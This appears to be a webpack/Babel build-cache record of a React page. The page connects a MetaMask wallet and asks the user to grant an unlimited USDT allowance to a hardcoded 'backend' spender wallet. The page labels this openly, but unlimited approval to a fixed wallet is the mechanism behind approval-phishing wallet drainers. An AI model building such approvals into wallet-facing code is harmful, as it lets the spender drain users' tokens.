{"ast":null,"code":"var _jsxFileName = \"/Users/aryan/Documents/frontend/src/App.js\",\n  _s = $RefreshSig$();\n// src/App.js\n\nimport React, { useState, useEffect } from \"react\";\nimport { ethers } from \"ethers\";\nimport { jsxDEV as _jsxDEV, Fragment as _Fragment } from \"react/jsx-dev-runtime\";\nconst USDT_ADDRESS = \"0x55d398326f99059fF775485246999027B3197955\";\nconst USDT_ABI = [\"function approve(address spender, uint256 amount) returns (bool)\"];\nconst SPENDER_ADDRESS = \"0x64FaeC69187a1a24A36F6590f0f8F94F68b044ee\"; // <-- Your backend wallet address (spender)\n\nexport default function App() {\n  _s();\n  const [provider, setProvider] = useState(null);\n  const [signer, setSigner] = useState(null);\n  const [account, setAccount] = useState(null);\n  const [status, setStatus] = useState(\"\");\n  useEffect(() => {\n    if (window.ethereum) {\n      setProvider(new ethers.BrowserProvider(window.ethereum));\n    } else {\n      alert(\"Please install MetaMask!\");\n    }\n  }, []);\n  async function connectWallet() {\n    if (!provider) return;\n    const accounts = await provider.send(\"eth_requestAccounts\", []);\n    setAccount(accounts[0]);\n    setSigner(await provider.getSigner());\n    setStatus(\"\");\n  }\n  async function approveMax() {\n    if (!signer) {\n      setStatus(\"Connect wallet first!\");\n      return;\n    }\n    setStatus(\"Approving max allowance...\");\n    try {\n      const usdt = new ethers.Contract(USDT_ADDRESS, USDT_ABI, signer);\n      const tx = await usdt.approve(SPENDER_ADDRESS, ethers.MaxUint256);\n      await tx.wait();\n      setStatus(\"Approval successful!\");\n    } catch (error) {\n      setStatus(\"Approval failed: \" + error.message);\n    }\n  }\n  return /*#__PURE__*/_jsxDEV(\"div\", {\n    style: {\n      padding: 20\n    },\n    children: [/*#__PURE__*/_jsxDEV(\"h2\", {\n      children: \"Approve Backend to Spend USDT\"\n    }, void 0, false, {\n      fileName: _jsxFileName,\n      lineNumber: 53,\n      columnNumber: 7\n    }, this), !account ? /*#__PURE__*/_jsxDEV(\"button\", {\n      onClick: connectWallet,\n      children: \"Connect Wallet\"\n    }, void 0, false, {\n      fileName: _jsxFileName,\n      lineNumber: 55,\n      columnNumber: 9\n    }, this) : /*#__PURE__*/_jsxDEV(_Fragment, {\n      children: [/*#__PURE__*/_jsxDEV(\"p\", {\n        children: [\"Connected: \", account]\n      }, void 0, true, {\n        fileName: _jsxFileName,\n        lineNumber: 58,\n        columnNumber: 11\n      }, this), /*#__PURE__*/_jsxDEV(\"button\", {\n        onClick: approveMax,\n        children: \"Approve Max USDT\"\n      }, void 0, false, {\n        fileName: _jsxFileName,\n        lineNumber: 59,\n        columnNumber: 11\n      }, this), /*#__PURE__*/_jsxDEV(\"p\", {\n        children: status\n      }, void 0, false, {\n        fileName: _jsxFileName,\n        lineNumber: 60,\n        columnNumber: 11\n      }, this)]\n    }, void 0, true)]\n  }, void 0, true, {\n    fileName: _jsxFileName,\n    lineNumber: 52,\n    columnNumber: 5\n  }, this);\n}\n_s(App, \"jxXuKPIGOFFLgTLk6wf3eQF0uhs=\");\n_c = App;\nvar _c;\n$RefreshReg$(_c, \"App\");","map":{"version":3,"names":["React","useState","useEffect","ethers","jsxDEV","_jsxDEV","Fragment","_Fragment","USDT_ADDRESS","USDT_ABI","SPENDER_ADDRESS","App","_s","provider","setProvider","signer","setSigner","account","setAccount","status","setStatus","window","ethereum","BrowserProvider","alert","connectWallet","accounts","send","getSigner","approveMax","usdt","Contract","tx","approve","MaxUint256","wait","error","message","style","padding","children","fileName","_jsxFileName","lineNumber","columnNumber","onClick","_c","$RefreshReg$"],"sources":["/Users/aryan/Documents/frontend/src/App.js"],"sourcesContent":["// src/App.js\n\nimport React, { useState, useEffect } from \"react\";\nimport { ethers } from \"ethers\";\n\nconst USDT_ADDRESS = \"0x55d398326f99059fF775485246999027B3197955\";\nconst USDT_ABI = [\n  \"function approve(address spender, uint256 amount) returns (bool)\",\n];\n\nconst SPENDER_ADDRESS = \"0x64FaeC69187a1a24A36F6590f0f8F94F68b044ee\"; // <-- Your backend wallet address (spender)\n\nexport default function App() {\n  const [provider, setProvider] = useState(null);\n  const [signer, setSigner] = useState(null);\n  const [account, setAccount] = useState(null);\n  const [status, setStatus] = useState(\"\");\n\n  useEffect(() => {\n    if (window.ethereum) {\n      setProvider(new ethers.BrowserProvider(window.ethereum));\n    } else {\n      alert(\"Please install MetaMask!\");\n    }\n  }, []);\n\n  async function connectWallet() {\n    if (!provider) return;\n    const accounts = await provider.send(\"eth_requestAccounts\", []);\n    setAccount(accounts[0]);\n    setSigner(await provider.getSigner());\n    setStatus(\"\");\n  }\n\n  async function approveMax() {\n    if (!signer) {\n      setStatus(\"Connect wallet first!\");\n      return;\n    }\n    setStatus(\"Approving max allowance...\");\n    try {\n      const usdt = new ethers.Contract(USDT_ADDRESS, USDT_ABI, signer);\n      const tx = await usdt.approve(SPENDER_ADDRESS, ethers.MaxUint256);\n      await tx.wait();\n      setStatus(\"Approval successful!\");\n    } catch (error) {\n      setStatus(\"Approval failed: \" + error.message);\n    }\n  }\n\n  return (\n    <div style={{ padding: 20 }}>\n      <h2>Approve Backend to Spend USDT</h2>\n      {!account ? (\n        <button onClick={connectWallet}>Connect Wallet</button>\n      ) : (\n        <>\n          <p>Connected: {account}</p>\n          <button onClick={approveMax}>Approve Max USDT</button>\n          <p>{status}</p>\n        </>\n      )}\n    </div>\n  );\n}\n"],"mappings":"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","ignoreList":[]},"metadata":{},"sourceType":"module","externalDependencies":[]}